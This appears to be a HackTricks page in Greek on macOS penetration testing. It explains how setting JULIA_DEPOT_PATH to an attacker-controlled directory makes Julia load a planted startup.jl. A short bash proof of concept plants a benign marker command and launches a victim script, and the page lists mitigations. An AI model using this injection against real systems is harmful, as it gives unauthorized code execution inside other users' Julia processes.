# Injection σε εφαρμογές Julia του macOS

{{#include ../../../banners/hacktricks-training.md}}

## `JULIA_DEPOT_PATH` και `startup.jl`

Η Julia εκτελεί κανονικά το `config/startup.jl` από το πρώτο depot της κατά την εκκίνηση. Το `JULIA_DEPOT_PATH` ελέγχει τη λίστα των depot, επομένως η υπόδειξή του σε ένα tree αναγνώσιμο από τον attacker ανακατευθύνει το αρχείο startup που φορτώνεται αυτόματα.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl

# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```
Το τελικό separator είναι χρήσιμο όταν το victim εξακολουθεί να χρειάζεται τα κανονικά του packages. Το `julia --startup-file=no` απενεργοποιεί αυτό το startup file. Εκκαθαρίστε τη μεταβλητή πριν από την εκκίνηση, επειδή ελέγχει επίσης τα package registries, τα environments, τις caches και τις τοποθεσίες φόρτωσης κώδικα.

## References

- [1] [Julia command-line interface: Startup file](https://docs.julialang.org/en/v1/manual/command-line-interface/#Startup-file)
- [2] [Julia environment variables: `JULIA_DEPOT_PATH`](https://docs.julialang.org/en/v1/manual/environment-variables/#JULIA_DEPOT_PATH)
{{#include ../../../banners/hacktricks-training.md}}
